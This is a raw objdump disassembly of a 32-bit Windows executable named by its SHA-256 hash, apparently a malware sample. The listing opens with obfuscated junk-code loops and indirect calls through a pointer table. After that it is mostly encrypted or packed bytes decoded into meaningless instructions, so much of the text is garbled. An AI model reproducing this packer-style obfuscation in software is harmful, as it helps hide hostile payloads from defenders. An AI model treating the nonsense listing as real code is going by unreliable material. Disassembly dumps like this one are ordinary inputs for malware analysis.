
d882b2295ac30c40dc5dfb399b864427304eeee3ea596cd86a5ceeb367a38c51.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	movzx  ecx,BYTE PTR ds:0x42fd0d
  401012:	mov    DWORD PTR [ebp-0x20],eax
  401015:	mov    ecx,DWORD PTR [ebp-0x20]
  401018:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40101f:	mov    DWORD PTR ds:0x42fd09,0x6cee
  401029:	cmp    ecx,eax
  40102b:	mov    DWORD PTR ds:0x42e11c,0x6120
  401035:	jne    0x402968
  40103b:	or     ecx,0x42d0
  401041:	mov    ax,WORD PTR [ebp-0x24]
  401045:	adc    DWORD PTR ds:0x42fcf1,edx
  40104b:	push   esi
  40104c:	and    DWORD PTR ds:0x42fcd9,0x0
  401056:	jmp    0x401068
  40105b:	mov    ecx,DWORD PTR ds:0x42fcd9
  401061:	inc    ecx
  401062:	mov    DWORD PTR ds:0x42fcd9,ecx
  401068:	cmp    DWORD PTR ds:0x42fcd9,0x1a
  40106f:	jae    0x4010b5
  401075:	cmp    DWORD PTR ds:0x42fcd9,0xf
  40107c:	jne    0x401090
  401082:	push   0x23a3
  401087:	push   DWORD PTR [ebp-0x10]
  40108a:	call   DWORD PTR ds:0x42e527
  401090:	cmp    DWORD PTR ds:0x42fcd9,0xe
  401097:	jne    0x4010aa
  40109d:	mov    ecx,DWORD PTR ds:0x42fcd9
  4010a3:	inc    ecx
  4010a4:	mov    DWORD PTR ds:0x42fcd9,ecx
  4010aa:	jmp    0x40105b
  4010af:	add    DWORD PTR ds:0x42e124,edx
  4010b5:	mov    ecx,0x8a3e
  4010ba:	xor    ax,cx
  4010bd:	sub    ecx,DWORD PTR ds:0x42e70b
  4010c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4010c6:	mov    DWORD PTR ds:0x42e6fb,0x11
  4010d0:	cmp    DWORD PTR ds:0x42e6fb,0x0
  4010d7:	je     0x4011ef
  4010dd:	cmp    DWORD PTR ds:0x42e6fb,0x8
  4010e4:	jne    0x401100
  4010ea:	push   0x42e128
  4010ef:	push   DWORD PTR [ebp-0x10]
  4010f2:	push   0x671d
  4010f7:	push   DWORD PTR [ebp-0x20]
  4010fa:	call   DWORD PTR ds:0x42e2cf
  401100:	cmp    DWORD PTR ds:0x42e6fb,0x9
  401107:	jne    0x40111c
  40110d:	xor    esi,esi
  40110f:	xor    esi,DWORD PTR ds:0x42e6fb
  401115:	dec    esi
  401116:	mov    DWORD PTR ds:0x42e6fb,esi
  40111c:	mov    esi,DWORD PTR ds:0x42e6fb
  401122:	dec    esi
  401123:	mov    DWORD PTR ds:0x42e6fb,esi
  401129:	jmp    0x4010d0
  40112e:	and    DWORD PTR ds:0x42e11c,0x0
  401138:	mov    esi,DWORD PTR ds:0x42e11c
  40113e:	inc    esi
  40113f:	mov    DWORD PTR ds:0x42e11c,esi
  401145:	cmp    DWORD PTR ds:0x42e11c,0xd
  40114c:	jne    0x401160
  401152:	push   0x3999
  401157:	push   DWORD PTR [ebp-0x20]
  40115a:	call   DWORD PTR ds:0x42e52b
  401160:	cmp    DWORD PTR ds:0x42e11c,0xc
  401167:	jne    0x40117c
  40116d:	xor    esi,esi
  40116f:	add    esi,DWORD PTR ds:0x42e11c
  401175:	inc    esi
  401176:	mov    DWORD PTR ds:0x42e11c,esi
  40117c:	cmp    DWORD PTR ds:0x42e11c,0x15
  401183:	jb     0x401138
  401189:	mov    DWORD PTR ds:0x42e134,0x1a
  401193:	cmp    DWORD PTR ds:0x42e134,0x0
  40119a:	je     0x4011ef
  4011a0:	cmp    DWORD PTR ds:0x42e134,0x25
  4011a7:	jne    0x4011d5
  4011ad:	push   0x42fd7a
  4011b2:	push   DWORD PTR [ebp-0x20]
  4011b5:	push   0x4679
  4011ba:	push   0x42fd82
  4011bf:	push   0x17d1
  4011c4:	push   0x42e227
  4011c9:	push   DWORD PTR [ebp-0x14]
  4011cc:	push   DWORD PTR [ebp-0x18]
  4011cf:	call   DWORD PTR ds:0x42e44b
  4011d5:	xor    esi,esi
  4011d7:	or     esi,DWORD PTR ds:0x42e134
  4011dd:	dec    esi
  4011de:	mov    DWORD PTR ds:0x42e134,esi
  4011e4:	jmp    0x401193
  4011e9:	add    DWORD PTR ds:0x42e6fb,ecx
  4011ef:	push   edi
  4011f0:	xor    esi,esi
  4011f2:	or     esi,DWORD PTR ds:0x42fd05
  4011f8:	adc    esi,DWORD PTR ds:0x42fd09
  4011fe:	mov    DWORD PTR ds:0x42fd05,esi
  401204:	mov    edi,0x3b04
  401209:	add    ax,di
  40120c:	mov    DWORD PTR ds:0x42e703,0x17
  401216:	cmp    DWORD PTR ds:0x42e703,0x0
  40121d:	je     0x401257
  401223:	cmp    DWORD PTR ds:0x42e703,0x26
  40122a:	jne    0x401243
  401230:	push   DWORD PTR [ebp-0x10]
  401233:	push   0x42e1c6
  401238:	push   0x42e17d
  40123d:	call   DWORD PTR ds:0x42e52f
  401243:	xor    esi,esi
  401245:	or     esi,DWORD PTR ds:0x42e703
  40124b:	dec    esi
  40124c:	mov    DWORD PTR ds:0x42e703,esi
  401252:	jmp    0x401216
  401257:	movzx  eax,ax
  40125a:	not    eax
  40125c:	and    eax,DWORD PTR [ecx]
  40125e:	mov    ecx,DWORD PTR [ebp+0x8]
  401261:	mov    DWORD PTR ds:0x42fd7e,0x12
  40126b:	cmp    DWORD PTR ds:0x42fd7e,0x0
  401272:	je     0x4012b2
  401278:	cmp    DWORD PTR ds:0x42fd7e,0x22
  40127f:	jne    0x4012a0
  401285:	push   0x42e227
  40128a:	push   0x7fee
  40128f:	push   DWORD PTR [ebp-0x28]
  401292:	push   DWORD PTR [ebp-0x24]
  401295:	push   0x4b6b
  40129a:	call   DWORD PTR ds:0x42e533
  4012a0:	mov    esi,DWORD PTR ds:0x42fd7e
  4012a6:	dec    esi
  4012a7:	mov    DWORD PTR ds:0x42fd7e,esi
  4012ad:	jmp    0x40126b
  4012b2:	mov    DWORD PTR [ecx],eax
  4012b4:	mov    ecx,0x7510855
  4012b9:	mov    esi,0x32729c
  4012be:	push   ebx
  4012bf:	mov    ax,WORD PTR [ebp-0x24]
  4012c3:	movzx  eax,ax
  4012c6:	mov    DWORD PTR [ebp-0x38],eax
  4012c9:	mov    eax,DWORD PTR [ebp+0x8]
  4012cc:	mov    DWORD PTR [ebp-0x28],eax
  4012cf:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  4012d6:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4012dd:	mov    eax,0x9577
  4012e2:	jmp    0x4014ff
  4012e7:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  4012ee:	cdq    
  4012ef:	js     0x401291
  4012f1:	mov    ah,0x66
  4012f3:	cdq    
  4012f4:	or     eax,0x70709f7d
  4012f9:	jo     0x40136b
  4012fb:	jo     0x40137b
  4012fd:	jo     0x40136f
  4012ff:	rcl    bh,0x3d
  401302:	aad    0x39
  401304:	ror    edi,cl
  401306:	rol    eax,1
  401308:	pop    es
  401309:	push   es
  40130a:	add    ecx,DWORD PTR [edi]
  40130c:	push   0x2
  40130e:	rdpmc  
  401310:	cmpps  xmm3,XMMWORD PTR [edx],0xc7
  401314:	adc    bl,BYTE PTR [edi]
  401316:	mov    ecx,0xddb7025a
  40131b:	add    bh,ch
  40131d:	mov    ebp,0x8003c8db
  401322:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401328:	lods   eax,DWORD PTR ds:[esi]
  401329:	sar    BYTE PTR [eax+0x6fee581f],1
  40132f:	or     edx,DWORD PTR [ecx]
  401331:	sahf   
  401332:	jp     0x4012fc
  401334:	inc    edx
  401335:	lods   al,BYTE PTR ds:[esi]
  401336:	push   ebx
  401337:	sub    eax,0xad3ec6d1
  40133c:	mov    WORD PTR [ebx-0x3b],?
  40133f:	stos   DWORD PTR es:[edi],eax
  401340:	js     0x401308
  401342:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401348:	jmp    0x40137c
  40134a:	mov    ebp,ecx
  40134c:	dec    edi
  40134d:	fcomp  DWORD PTR [eax-0x656800bf]
  401353:	pop    es
  401354:	test   eax,0xed4dbddc
  401359:	sub    BYTE PTR [ebp+0x23],dl
  40135c:	mov    ah,0xec
  40135e:	pusha  
  40135f:	nop
  401360:	mov    esi,0x94c3117b
  401365:	and    esi,edx
  401367:	jmp    0x4013b9
  401369:	(bad)  
  40136a:	out    0xba,al
  40136c:	repnz in al,dx
  40136e:	xchg   esp,eax
  40136f:	xor    edi,ecx
  401371:	jbe    0x4013d8
  401373:	xlat   BYTE PTR ds:[ebx]
  401374:	and    cl,ch
  401376:	add    al,0xd9
  401378:	adc    DWORD PTR [ecx-0x68],edx
  40137b:	xor    eax,0x7a616f03
  401380:	or     dh,BYTE PTR [ecx]
  401382:	fld    QWORD PTR [eax+0x7f752a56]
  401388:	xor    BYTE PTR [edi+0xba8db0c],cl
  40138e:	pop    ebx
  40138f:	push   ebp
  401390:	(bad)  
  401392:	or     ebx,edx
  401394:	pop    esi
  401395:	fstp   DWORD PTR [ecx]
  401397:	jno    0x401329
  401399:	mov    eax,0x2b15374b
  40139e:	ja     0x4013c9
  4013a0:	sbb    al,0xd3
  4013a2:	xor    BYTE PTR [edi-0x16],cl
  4013a5:	int    0xa6
  4013a7:	scas   eax,DWORD PTR es:[edi]
  4013a8:	(bad)  
  4013a9:	iret   
  4013aa:	(bad)  
  4013ac:	push   ss
  4013ad:	or     al,0xca
  4013af:	cdq    
  4013b0:	ffree  st(2)
  4013b2:	jmp    0x6c97:0x5ad8227e
  4013b9:	push   ebx
  4013ba:	sahf   
  4013bb:	scas   al,BYTE PTR es:[edi]
  4013bc:	icebp  
  4013bd:	cwde   
  4013be:	sbb    ch,BYTE PTR [edx-0xf]
  4013c1:	mov    ebx,0x1f6eaaa3
  4013c6:	xor    ecx,DWORD PTR [ebx-0x61]
  4013c9:	jo     0x401396
  4013cb:	out    dx,eax
  4013cc:	push   0xee0d4bf2
  4013d1:	int3   
  4013d2:	mov    esi,0x80839812
  4013d7:	dec    edx
  4013d8:	mov    al,ds:0xb6e02e8a
  4013dd:	jp     0x4013b2
  4013df:	cld    
  4013e0:	xor    al,0x64
  4013e2:	inc    edi
  4013e3:	xchg   ecx,eax
  4013e4:	fistp  QWORD PTR [ebx+0x4f]
  4013e7:	aas    
  4013e8:	or     bl,al
  4013ea:	dec    esi
  4013eb:	sub    al,0x8c
  4013ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013ee:	ja     0x40146f
  4013f0:	xor    BYTE PTR [ebp-0x6e1aba75],dh
  4013f6:	scas   eax,DWORD PTR es:[edi]
  4013f7:	fucomp st(7)
  4013f9:	mov    eax,0xcc8f41c2
  4013fe:	sbb    DWORD PTR [ebp-0x7cf8c5dc],edi
  401404:	jae    0x4013b6
  401406:	or     eax,0x6bf221a1
  40140b:	aaa    
  40140c:	jmp    0x4013e4
  40140e:	lods   eax,DWORD PTR ds:[esi]
  40140f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401410:	ss xor eax,0xa303a86b
  401416:	in     eax,0xa
  401418:	dec    esi
  401419:	cs push eax
  40141b:	into   
  40141c:	push   eax
  40141d:	mov    ecx,0x9bfe5526
  401422:	div    al
  401424:	popf   
  401425:	xchg   esp,eax
  401426:	lods   eax,DWORD PTR ds:[esi]
  401427:	ss mov edi,0xa9602e5b
  40142d:	and    esi,esi
  40142f:	sti    
  401430:	fisubr DWORD PTR [esi+0x48]
  401433:	mov    al,ds:0xcc1935be
  401438:	test   WORD PTR [esi],0xc8ff
  40143d:	(bad)  
  40143e:	mov    bl,0xa8
  401440:	sbb    cl,BYTE PTR [eax-0x22014cc1]
  401446:	aaa    
  401447:	mov    dl,BYTE PTR [ebx]
  401449:	add    edx,DWORD PTR [ebx+0x6b]
  40144c:	mov    ebp,0x1c09d0cb
  401451:	xchg   edi,eax
  401452:	push   edi
  401453:	out    0x30,eax
  401455:	aaa    
  401456:	loop   0x4014cd
  401458:	mov    edi,0x2bdc838b
  40145d:	jmp    0x82fb144c
  401462:	xor    DWORD PTR [edi-0x7f],ecx
  401465:	clc    
  401466:	inc    esp
  401467:	inc    edx
  401468:	daa    
  401469:	in     eax,0x56
  40146b:	add    DWORD PTR [eax-0x52fa094a],0x3d3c854f
  401475:	inc    BYTE PTR [si+0x2410]
  40147a:	aad    0x95
  40147c:	dec    esi
  40147d:	ins    BYTE PTR es:[edi],dx
  40147e:	test   eax,0x78aca950
  401483:	mov    al,0x1e
  401485:	fcom   QWORD PTR [ebx]
  401487:	shr    bl,cl
  401489:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40148a:	mov    fs,WORD PTR [ebp+0x40fa8972]
  401490:	and    eax,0xe9755032
  401495:	scas   al,BYTE PTR es:[edi]
  401496:	dec    cl
  401498:	push   ebx
  401499:	ins    DWORD PTR es:[edi],dx
  40149a:	in     al,dx
  40149b:	neg    DWORD PTR [ebx+ecx*4]
  40149e:	push   ecx
  40149f:	shr    bh,cl
  4014a1:	rcr    DWORD PTR [eax+0x1c],cl
  4014a4:	cld    
  4014a5:	imul   esp,DWORD PTR [eax-0x59c0d43a],0xb0e79256
  4014af:	lock or dl,dl
  4014b2:	jmp    0x40152e
  4014b4:	sti    
  4014b5:	mov    al,BYTE PTR [edi+0x5e66be13]
  4014bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4014bc:	and    edi,DWORD PTR [bx+di+0x6c]
  4014c0:	mov    ch,0xce
  4014c2:	inc    edi
  4014c3:	stos   DWORD PTR es:[edi],eax
  4014c4:	mov    WORD PTR [esp+ebx*1],cs
  4014c7:	ficom  WORD PTR [eax+eax*8+0x737502ce]
  4014ce:	and    al,0x31
  4014d0:	fild   WORD PTR [edi-0x33]
  4014d3:	pop    edi
  4014d4:	ins    BYTE PTR es:[edi],dx
  4014d5:	cdq    
  4014d6:	fst    QWORD PTR [ecx-0x5f]
  4014d9:	pop    esi
  4014da:	retf   0xc5e0
  4014dd:	sbb    DWORD PTR [ecx-0x7c378cf6],ebp
  4014e3:	lds    ebp,FWORD PTR [edi-0x3630bac]
  4014e9:	jne    0x4014d0
  4014eb:	or     bh,cl
  4014ed:	mov    DWORD PTR [ecx-0x33],esp
  4014f0:	add    BYTE PTR [eax+0x108b794e],0x46
  4014f7:	xor    dh,BYTE PTR [edi]
  4014f9:	jmp    0xe6a92e68
  4014fe:	inc    eax
  4014ff:	mov    WORD PTR [ebp-0x4],ax
  401503:	jmp    0x401720
  401508:	clc    
  401509:	icebp  
  40150a:	mov    esp,0xb8b16984
  40150f:	icebp  
  401510:	ficomp DWORD PTR [edx-0x5422e013]
  401516:	inc    edx
  401517:	jl     0x401589
  401519:	jle    0x40158b
  40151b:	jo     0x40158d
  40151d:	jle    0x40158f
  40151f:	jo     0x4014af
  401521:	xor    al,0xbf
  401523:	push   ds
  401524:	outs   dx,DWORD PTR ds:[esi]
  401525:	leave  
  401526:	push   ebx
  401527:	lahf   
  401528:	mov    eax,0x2d59b79a
  40152d:	sahf   
  40152e:	push   0x4e56f1f1
  401533:	xor    dl,BYTE PTR [edi-0x566151e3]
  401539:	pop    esi
  40153a:	pusha  
  40153b:	hlt    
  40153c:	int    0x3f
  40153e:	in     al,dx
  40153f:	aas    
  401540:	pop    ebp
  401541:	ins    BYTE PTR es:[edi],dx
  401542:	inc    ebx
  401543:	jle    0x40154a
  401545:	pop    ds
  401546:	mov    ebp,0xd9d83479
  40154b:	popa   
  40154c:	gs cmp ch,0xab
  401550:	std    
  401551:	mov    cs,WORD PTR [edx-0xd]
  401554:	mov    ch,0x18
  401556:	push   ds
  401557:	jmp    0x615cc4d0
  40155c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40155d:	cmp    DWORD PTR [edx],ecx
  40155f:	(bad)  
  401561:	mov    al,0xf6
  401563:	das    
  401564:	repz jle 0x4015a5
  401567:	iret   
  401568:	rcl    DWORD PTR [eax+0x4b],0x87
  40156c:	jmp    0x401506
  40156e:	sti    
  40156f:	push   edx
  401570:	push   esi
  401571:	ret    0x896a
  401574:	xchg   edx,eax
  401575:	and    ebp,edx
  401577:	dec    ebp
  401578:	call   0xc036:0x3f7c975f
  40157f:	fisttp WORD PTR [edi]
  401581:	inc    ecx
  401582:	ret    
  401583:	cmp    DWORD PTR [esi+eiz*2-0x50b4216f],ebp
  40158a:	cwde   
  40158b:	jmp    0x529c:0x8bd94b2f
  401592:	pop    ss
  401593:	stos   DWORD PTR es:[edi],eax
  401594:	jne    0x4015c8
  401596:	mov    ah,0x8b
  401598:	jp     0x4015a0
  40159a:	xchg   ebp,eax
  40159b:	int    0x28
  40159d:	stos   DWORD PTR es:[edi],eax
  40159e:	fsub   DWORD PTR [edx]
  4015a0:	and    ah,BYTE PTR ds:0x7b0e62a9
  4015a6:	xchg   esp,eax
  4015a7:	mov    dl,0x7b
  4015a9:	xor    BYTE PTR [ecx+0x48e5bdb8],ch
  4015af:	add    BYTE PTR [edx+0x2fe85cb8],al
  4015b5:	xor    BYTE PTR [ebx],ch
  4015b7:	inc    edi
  4015b8:	test   bl,al
  4015ba:	lea    edx,[edx]
  4015bc:	or     al,BYTE PTR [edi+0x1fca2540]
  4015c2:	aam    0x63
  4015c4:	gs jle 0x4015d9
  4015c7:	fcmove st,st(3)
  4015c9:	and    esp,ebx
  4015cb:	enter  0x8cea,0x8
  4015cf:	jecxz  0x4015c4
  4015d1:	mov    ch,0x99
  4015d3:	cmp    al,0x4b
  4015d5:	push   eax
  4015d6:	aam    0x7e
  4015d8:	xor    DWORD PTR ds:[ecx-0x4e],edx
  4015dc:	loope  0x4015c4
  4015de:	fwait
  4015df:	push   esi
  4015e0:	sti    
  4015e1:	fs pop es
  4015e3:	fwait
  4015e4:	enter  0x6cd4,0x26
  4015e8:	and    eax,0x5588eb29
  4015ed:	das    
  4015ee:	xchg   esp,eax
  4015ef:	xchg   edx,eax
  4015f0:	(bad)  
  4015f1:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4015f3:	mov    esp,0xe5096296
  4015f8:	dec    eax
  4015f9:	les    eax,FWORD PTR [esi]
  4015fb:	mov    esp,0x39741917
  401600:	xor    BYTE PTR [eax],bh
  401602:	jmp    0xf540:0xb8e986a3
  401609:	push   cs
  40160a:	addr16 test eax,0xac1d34fb
  401610:	nop
  401611:	mov    al,0x4
  401613:	push   esp
  401614:	rcl    BYTE PTR [esi],0xe7
  401617:	aad    0x50
  401619:	or     BYTE PTR [ebp+0x6e],ch
  40161c:	cmp    al,0x15
  40161e:	xor    esi,esi
  401620:	fucom  st(7)
  401622:	cli    
  401623:	pop    ebp
  401624:	add    al,BYTE PTR [eax+0x2b0004f0]
  40162a:	fidivr DWORD PTR [ebx-0x9]
  40162d:	cmp    DWORD PTR [edx],0xffffff85
  401630:	sbb    al,0xd7
  401632:	sub    edi,eax
  401634:	cmp    eax,0x43aeffa3
  401639:	pop    ecx
  40163a:	mov    edx,0xac17f439
  40163f:	jp     0x401677
  401641:	fwait
  401642:	or     al,0xc1
  401644:	and    eax,edx
  401646:	xchg   DWORD PTR [edi],ecx
  401648:	adc    ch,bh
  40164a:	fmul   st(5),st
  40164c:	shr    BYTE PTR [edi],1
  40164e:	into   
  40164f:	cmp    eax,0xe47a9f38
  401654:	imul   edi,DWORD PTR [ecx+esi*4+0x26da0c6c],0xae525eb
  40165f:	fldenv [edx]
  401661:	arpl   sp,di
  401663:	test   al,0x24
  401665:	fisubr WORD PTR [ecx*1+0x258f54fd]
  40166c:	mov    edx,0xf24ac00b
  401671:	fisubr DWORD PTR [ebp+esi*4-0x40152786]
  401678:	dec    ebp
  401679:	add    esp,ecx
  40167b:	push   edi
  40167c:	inc    esp
  40167d:	jle    0x40169c
  40167f:	mov    esp,0x4351eaaa
  401684:	std    
  401685:	and    DWORD PTR [eax-0x4fa44702],esp
  40168b:	loope  0x4016f0
  40168d:	int    0x2b
  40168f:	adc    edx,DWORD PTR [ecx-0x4e149b0e]
  401695:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401696:	xchg   esi,eax
  401697:	sub    DWORD PTR [esi-0x49],eax
  40169a:	dec    edi
  40169b:	jae    0x4016a7
  40169d:	xchg   edx,eax
  40169e:	xor    eax,0x1795d582
  4016a3:	jg     0x401679
  4016a5:	dec    ebx
  4016a6:	and    al,0x7a
  4016a8:	jne    0x401674
  4016aa:	add    al,0x7
  4016ac:	or     DWORD PTR [edi-0x51],esp
  4016af:	retf   
  4016b0:	js     0x4016cf
  4016b2:	inc    edi
  4016b3:	out    0x15,eax
  4016b5:	or     ah,dh
  4016b7:	mov    cl,0xb6
  4016b9:	lahf   
  4016ba:	jb     0x4016f3
  4016bc:	mov    cl,0xd
  4016be:	jg     0x401676
  4016c0:	les    edi,FWORD PTR [ecx-0x377b352a]
  4016c6:	push   cx
  4016c8:	pop    edi
  4016c9:	mov    esp,0x2e98ec68
  4016ce:	aad    0xc
  4016d0:	es in  eax,dx
  4016d2:	ins    DWORD PTR es:[edi],dx
  4016d3:	xchg   BYTE PTR [esi],al
  4016d5:	mov    esi,0xdd70e66e
  4016da:	or     eax,0x975c4b30
  4016df:	aas    
  4016e0:	call   FWORD PTR [edi]
  4016e2:	shl    ecx,0x83
  4016e5:	pusha  
  4016e6:	aam    0xc3
  4016e8:	loope  0x4016a3
  4016ea:	repnz inc ebx
  4016ec:	mov    al,ds:0xe4a5dd41
  4016f1:	cmp    eax,0xafde012e
  4016f6:	int3   
  4016f7:	cwde   
  4016f8:	push   ebp
  4016f9:	pop    esp
  4016fa:	mov    edi,0x23b483b0
  4016ff:	ds jmp 0x4016f0
  401702:	inc    ebx
  401703:	mov    ds:0x2779a0a7,al
  401708:	push   0x7def7d5c
  40170d:	loopne 0x4016ad
  40170f:	mov    DWORD PTR [eax+0x10],esp
  401712:	je     0x4016f7
  401714:	cmp    al,0x15
  401716:	dec    esp
  401717:	fisttp DWORD PTR [edx]
  401719:	in     al,0x82
  40171b:	les    esp,FWORD PTR [edx-0x72cf7487]
  401721:	inc    ebp
  401722:	ror    BYTE PTR [ecx+0x458bcc45],1
  401728:	fmul   DWORD PTR [ecx+0x458dd445]
  40172e:	call   0x42301c
  401733:	add    BYTE PTR [ebp-0x31],cl
  401736:	lods   eax,DWORD PTR ds:[esi]
  401737:	dec    ebx
  401738:	lods   eax,DWORD PTR ds:[esi]
  401739:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  401740:	lea    esi,[edi-0x63]
  401743:	inc    ebx
  401744:	jo     0x4017c2
  401746:	jo     0x4017b8
  401748:	jo     0x4017c8
  40174a:	jo     0x4017bc
  40174c:	pop    ebp
  40174d:	cwde   
  40174e:	xlat   BYTE PTR ds:[ebx]
  40174f:	cmp    DWORD PTR [esi+0xa],esi
  401752:	xor    al,0x3f
  401754:	outs   dx,DWORD PTR ds:[esi]
  401755:	in     eax,0xbb
  401757:	mov    ds:0xe3a98b3d,eax
  40175c:	pop    edx
  40175d:	hlt    
  40175e:	mov    DWORD PTR [esi],esp
  401760:	jmp    0x4017bd
  401762:	dec    eax
  401763:	ins    BYTE PTR es:[edi],dx
  401764:	mov    ds:0x4e20eeb5,al
  401769:	mov    edi,0x64570827
  40176e:	test   al,0xea
  401770:	idiv   BYTE PTR [edi+0x6681a855]
  401776:	lds    edx,FWORD PTR [eax]
  401778:	add    ebp,ebp
  40177a:	outs   dx,DWORD PTR ds:[esi]
  40177b:	rol    ebx,cl
  40177d:	xchg   esi,eax
  40177e:	cdq    
  40177f:	add    edx,ecx
  401781:	push   ds
  401782:	add    al,0x38
  401784:	sbb    al,0x7f
  401786:	scas   al,BYTE PTR es:[edi]
  401787:	popa   
  401788:	dec    ecx
  401789:	leave  
  40178a:	int3   
  40178b:	cmp    BYTE PTR [edi],bh
  40178d:	mov    WORD PTR [eax],es
  40178f:	test   ch,ah
  401791:	hlt    
  401792:	imul   edi,ebp,0xffffffe7
  401795:	retf   0xcc20
  401798:	sti    
  401799:	mov    BYTE PTR [ecx],ch
  40179b:	sbb    DWORD PTR [edi],ebp
  40179d:	mov    esi,0x430823c7
  4017a2:	jns    0x4017d7
  4017a4:	or     eax,esi
  4017a6:	mov    al,ds:0xc91d4cb3
  4017ab:	sbb    al,0x44
  4017ad:	or     ecx,ebx
  4017af:	(bad)  
  4017b0:	(bad)  [ecx+0x9d2bb20]
  4017b6:	jge    0x401758
  4017b8:	inc    edi
  4017b9:	loop   0x4017bf
  4017bb:	(bad)  
  4017bc:	sbb    eax,0x98854866
  4017c1:	push   0x729a98e2
  4017c6:	inc    ebx
  4017c7:	rol    dh,0x4
  4017ca:	in     eax,dx
  4017cb:	cld    
  4017cc:	dec    ebp
  4017cd:	call   0x41118633
  4017d2:	mov    edx,0x29b401d8
  4017d7:	ins    DWORD PTR es:[edi],dx
  4017d8:	ds jns 0x401762
  4017db:	cmp    DWORD PTR [ebp+edx*4+0x282f65b5],ebx
  4017e2:	cmp    bl,dh
  4017e4:	outs   dx,DWORD PTR ds:[esi]
  4017e5:	out    0xe3,al
  4017e7:	sub    eax,0xadc2357e
  4017ec:	mov    ss,WORD PTR [edi*2-0x2d4b7fa0]
  4017f3:	push   0xffffffd0
  4017f5:	adc    eax,DWORD PTR [bp+di-0x5653]
  4017fa:	aad    0xcc
  4017fc:	ds out dx,al
  4017fe:	ds and eax,0xea5cbc0f
  401804:	jecxz  0x40186c
  401806:	fild   DWORD PTR [ecx]
  401808:	jmp    0x1c91:0xad8d9625
  40180f:	pop    ss
  401810:	push   ebx
  401811:	and    ch,bl
  401813:	aaa    
  401814:	sbb    DWORD PTR [esi],eax
  401816:	in     al,0x96
  401818:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401819:	fldenv [ecx+0x55]
  40181c:	cwde   
  40181d:	lods   al,BYTE PTR ds:[esi]
  40181e:	mul    DWORD PTR ds:0x2507e073
  401824:	mov    ebp,0xa6bebc7c
  401829:	clc    
  40182a:	leave  
  40182b:	daa    
  40182c:	dec    esi
  40182d:	js     0x401884
  40182f:	xchg   edi,eax
  401830:	mov    edx,0x3279c814
  401835:	pop    esi
  401836:	xor    eax,0x9bbf9523
  40183b:	call   ebp
  40183d:	pusha  
  40183e:	add    ebx,DWORD PTR [eax-0x35]
  401841:	pop    edi
  401842:	jp     0x40181a
  401844:	sbb    dl,BYTE PTR [eax+ebp*1]
  401847:	and    BYTE PTR [ebp+0x3c],bh
  40184a:	outs   dx,BYTE PTR ds:[esi]
  40184b:	or     bl,al
  40184d:	sbb    DWORD PTR [esi],ebp
  40184f:	retf   0xec64
  401852:	sbb    BYTE PTR [ecx-0x12d763e8],0x33
  401859:	jmp    0x401811
  40185b:	ror    DWORD PTR [ebx],1
  40185d:	lods   eax,DWORD PTR ds:[esi]
  40185e:	mov    es,WORD PTR [esi]
  401860:	inc    esp
  401861:	sub    BYTE PTR [eax+0x1c],0x64
  401865:	out    0x56,al
  401867:	and    ebx,DWORD PTR [ebx]
  401869:	loope  0x401878
  40186b:	or     bh,BYTE PTR [ecx-0x36847ad9]
  401871:	bound  edx,QWORD PTR [eax]
  401873:	cmp    eax,edi
  401875:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  401877:	jae    0x4018a5
  401879:	fisttp QWORD PTR [edx]
  40187b:	push   0x59
  40187d:	out    dx,eax
  40187e:	out    dx,eax
  40187f:	jns    0x401826
  401881:	push   0x1e5339d3
  401886:	inc    ebp
  401887:	int    0xe4
  401889:	les    edi,FWORD PTR [edx+0x73fbd663]
  40188f:	enter  0x2788,0x36
  401893:	pop    edi
  401894:	in     al,dx
  401895:	jecxz  0x4018a5
  401897:	push   ecx
  401898:	and    edi,DWORD PTR [edi]
  40189a:	add    esi,ebx
  40189c:	jmp    0x133c:0x84b87de5
  4018a3:	cld    
  4018a4:	icebp  
  4018a5:	pop    edi
  4018a6:	mov    ebx,DWORD PTR [ecx-0x25f57fdc]
  4018ac:	xor    DWORD PTR fs:[edi+0x78df4127],0xf2b55d97
  4018b7:	sub    DWORD PTR [ebx-0x8],eax
  4018ba:	lea    ecx,[edx]
  4018bc:	adc    eax,DWORD PTR [edi]
  4018be:	idiv   BYTE PTR [edx+0x3b48f050]
  4018c4:	xor    BYTE PTR [eax+0x74],cl
  4018c7:	inc    ebx
  4018c8:	xchg   esi,eax
  4018c9:	loopne 0x401899
  4018cb:	leave  
  4018cc:	call   0x4da111b8
  4018d1:	leave  
  4018d2:	or     al,0xb6
  4018d4:	(bad)  
  4018d6:	or     eax,0xc433016c
  4018db:	and    ebx,DWORD PTR [eax+edx*8+0x6ff6892a]
  4018e2:	jl     0x40186c
  4018e4:	int3   
  4018e5:	pop    ss
  4018e6:	and    al,0xdd
  4018e8:	adc    al,0x61
  4018ea:	jmp    0x980a:0xe89ab0ec
  4018f1:	popa   
  4018f2:	(bad)  
  4018f3:	fsubr  QWORD PTR [ecx]
  4018f5:	shl    dl,1
  4018f7:	xlat   BYTE PTR ds:[ebx]
  4018f8:	out    0x9,al
  4018fa:	sbb    al,0x32
  4018fc:	fisub  DWORD PTR [ecx-0xe]
  4018ff:	mov    ecx,0xb67b37c7
  401904:	adc    DWORD PTR [ecx+0x7b],0x5a9ef451
  40190b:	outs   dx,BYTE PTR ds:[esi]
  40190c:	push   edx
  40190d:	data16 fucomi st,st(1)
  401910:	lahf   
  401911:	fbstp  TBYTE PTR [di+0x5fe7]
  401916:	dec    ebp
  401917:	xor    ch,BYTE PTR [ebp-0x204096ca]
  40191d:	push   esi
